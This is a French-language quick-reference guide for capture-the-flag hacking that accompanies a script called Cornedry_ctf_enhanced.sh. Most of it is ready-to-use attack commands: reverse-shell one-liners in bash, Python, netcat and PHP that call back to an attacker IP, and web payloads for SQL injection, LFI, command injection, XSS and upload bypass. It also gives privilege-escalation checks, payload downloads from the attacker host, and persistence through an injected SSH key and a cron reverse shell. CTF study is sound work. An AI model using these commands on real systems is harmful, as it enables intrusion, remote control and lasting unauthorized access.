# 🚀 Cornedry CTF - GUIDE DE SURVIE RAPIDE

## ⚡ DÉMARRAGE RAPIDE

```bash
chmod +x Cornedry_ctf_enhanced.sh
./Cornedry_ctf_enhanced.sh
```

## 🎯 WORKFLOW OPTIMISÉ POUR CTF

### Phase 1: Reconnaissance (5 minutes)
```bash
# Dans le menu [1] Quick Recon → [7] All-in-One
# Pendant que ça scan, prendre des notes !
```

### Phase 2: Identification (2 minutes)
- Regarder les ports ouverts
- Identifier les services
- Noter les versions

### Phase 3: Exploitation (Variable)
- Web → Menu [2]
- Accès système → Menu [3] Reverse Shells
- PrivEsc → Menu [4]

## 🔥 COMMANDES ONE-LINER ULTRA-RAPIDES

### Reconnaissance Express
```bash
# Scan top ports en 30 secondes
nmap -T5 -F <target>

# Web quick enum
whatweb <target> && curl -I <target>

# Directory bruteforce rapide
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50 -q
```

### Reverse Shells Instantanés
```bash
# Bash (le plus simple)
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

# Python (si bash pas dispo)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (version MKFifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f

# PHP (pour webshells)
php -r '$sock=fsockopen("<YOUR_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Listener (sur votre machine)
nc -lvnp 4444
# ou avec pwncat pour shell amélioré
pwncat-cs -l 4444
```

### Upgrade Shell (TRÈS IMPORTANT!)
```bash
# Méthode Python (LA MEILLEURE)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Puis:
CTRL+Z
stty raw -echo; fg
export TERM=xterm
# Maintenant tu as un vrai shell!

# Alternative avec script
script /dev/null -c bash
```

### PrivEsc Linux - Check Rapides
```bash
# SUID binaries (or en barre)
find / -perm -4000 2>/dev/null

# Sudo permissions
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Writable /etc/passwd ?
ls -la /etc/passwd

# Docker ?
groups
docker ps

# Kernel exploit ?
uname -a
searchsploit linux kernel $(uname -r)
```

### Web Exploitation Rapide
```bash
# SQL Injection test rapide
' OR 1=1-- -
admin' OR '1'='1
' UNION SELECT NULL--

# LFI test
../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php

# Command injection
; whoami
| whoami
`whoami`
$(whoami)

# XSS test
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# File upload bypass
.php.jpg
.php5, .phtml, .phar
shell.PhP (case variation)
```

### Password Cracking Ultra-Rapide
```bash
# Hash identifier
hash-identifier

# John avec rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crackstation (online)
# https://crackstation.net/

# Si hash SSH
ssh2john id_rsa > hash.txt
john hash.txt
```

## 🎪 ASTUCES CTF AVANCÉES

### 1. Stabiliser le Shell IMMÉDIATEMENT
```bash
# Dès que tu as un shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 116  # Ajuste selon ton terminal
```

### 2. Transfert de Fichiers Rapide
```bash
# Sur ta machine (serveur HTTP)
python3 -m http.server 8000

# Sur la cible
wget http://<YOUR_IP>:8000/linpeas.sh
# ou
curl http://<YOUR_IP>:8000/linpeas.sh -o linpeas.sh
```

### 3. Port Forwarding (accès services internes)
```bash
# SSH Local Port Forward
ssh -L 8080:localhost:80 user@target

# Chisel (pour machines sans SSH)
# Sur ta machine:
./chisel server -p 8000 --reverse
# Sur la cible:
./chisel client <YOUR_IP>:8000 R:8080:localhost:80
```

### 4. Recherche de Flags
```bash
# Recherche récursive de flags
grep -r "flag{" / 2>/dev/null
find / -name "*flag*" 2>/dev/null
locate flag
find / -type f -name "*.txt" -exec grep -l "flag" {} \; 2>/dev/null
```

### 5. Persistence (si multi-jour)
```bash
# Ajouter clé SSH
mkdir ~/.ssh
echo "<YOUR_PUBLIC_KEY>" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Cronjob reverse shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'" | crontab -
```

## 🚨 CHECKLIST PAR TYPE DE MACHINE

### 🌐 Machine Web
- [ ] Port 80/443 ouvert ?
- [ ] Technologie identifiée (WhatWeb) ?
- [ ] Directory bruteforce (Gobuster/Dirb)
- [ ] Test SQL injection sur formulaires
- [ ] Test LFI/RFI sur paramètres
- [ ] Upload de fichiers possible ?
- [ ] Robots.txt, sitemap.xml ?
- [ ] Code source (Ctrl+U) ?
- [ ] Cookies/JWT à décoder ?

### 🐧 Machine Linux
- [ ] Services exposés (Nmap)
- [ ] SSH brute force possible ?
- [ ] Version kernel vulnérable ?
- [ ] SUID binaries exploitables ?
- [ ] Sudo permissions ?
- [ ] Cron jobs modifiables ?
- [ ] NFS shares ?
- [ ] Docker accessible ?

### 🪟 Machine Windows
- [ ] SMB enumération (enum4linux)
- [ ] RDP accessible ?
- [ ] Credentials par défaut ?
- [ ] NTLM hashes (Responder)
- [ ] Mimikatz sur mémoire ?
- [ ] Services non patchés ?
- [ ] UAC bypass nécessaire ?

## 💎 OUTILS ESSENTIELS À INSTALLER AVANT LE CTF

```bash
# Installation rapide des essentiels
sudo apt update
sudo apt install -y nmap gobuster nikto sqlmap hydra john hashcat \
    dirb wfuzz feroxbuster seclists wordlists

# Python tools
pip3 install impacket pwncat-cs

# Git tools
git clone https://github.com/carlospolop/PEASS-ng.git ~/tools/PEASS-ng
git clone https://github.com/diego-treitos/linux-smart-enumeration.git ~/tools/lse

# Wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
git clone https://github.com/danielmiessler/SecLists.git ~/tools/SecLists
```

## 📝 ORGANISATION PENDANT LE CTF

### Structure de dossiers (automatique avec le script)
```
~/ctf_workspace/
├── logs/          # Logs de session
├── loot/          # Credentials, flags trouvés
├── scans/         # Résultats des scans
├── exploits/      # Payloads générés
└── notes/         # Notes rapides
```

### Prise de Notes Efficace
```bash
# Toujours documenter dans le script (Menu [7])
# Format:
[HH:MM] Action effectuée → Résultat

# Exemple:
[14:30] Nmap scan → Ports 22,80,443 ouverts
[14:35] Gobuster → /admin trouvé
[14:40] SQL injection → Accès DB users
```

## 🎯 STRATÉGIE DE SCORING

### Priorisation
1. **Low Hanging Fruits** (0-15 min)
   - Default credentials
   - Exposed config files
   - Obvious vulnerabilities

2. **Medium Challenges** (15-45 min)
   - Basic exploits
   - Simple privilege escalation
   - Web vulnerabilities

3. **Hard Challenges** (45+ min)
   - Buffer overflows
   - Complex chains
   - Reverse engineering

### Time Management
- **Ne jamais rester bloqué > 20 min** sur un seul challenge
- Passer à un autre, revenir plus tard
- Demander des hints si disponibles
- Collaborer avec l'équipe

## 🔧 DEBUGGING RAPIDE

### Shell ne fonctionne pas ?
```bash
# Test de connectivité
ping -c 1 <YOUR_IP>

# Firewall ?
nc -zv <YOUR_IP> 4444

# Wrong listener ?
ss -tlnp | grep 4444
```

### Exploit ne marche pas ?
```bash
# Vérifier version exacte
cat /etc/os-release
uname -a

# Compiler sur place si nécessaire
gcc exploit.c -o exploit

# Python version ?
python --version
python3 --version
```

## 🏆 DERNIERS CONSEILS

1. **Toujours stabiliser le shell en premier**
2. **Sauvegarder chaque étape importante**
3. **Tester les exploits en local d'abord si possible**
4. **Lire les hints du CTF (souvent dans noms/descriptions)**
5. **Google est ton ami** (mais pas de triche!)
6. **Prendre des breaks** (meilleure productivité)
7. **S'amuser !** C'est l'objectif principal 🎉

## 📚 RESSOURCES UTILES

### Références
- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- CrackStation: https://crackstation.net/

### Practice Platforms
- TryHackMe: https://tryhackme.com/
- HackTheBox: https://www.hackthebox.eu/
- OverTheWire: https://overthewire.org/

---

## 🎮 GOOD LUCK & HAPPY HACKING!

**Remember**: Le CTF c'est pour apprendre et s'amuser. Chaque échec est une leçon !

*"The quieter you become, the more you can hear."* - Ram Dass (but also applicable to pentesting 😉)
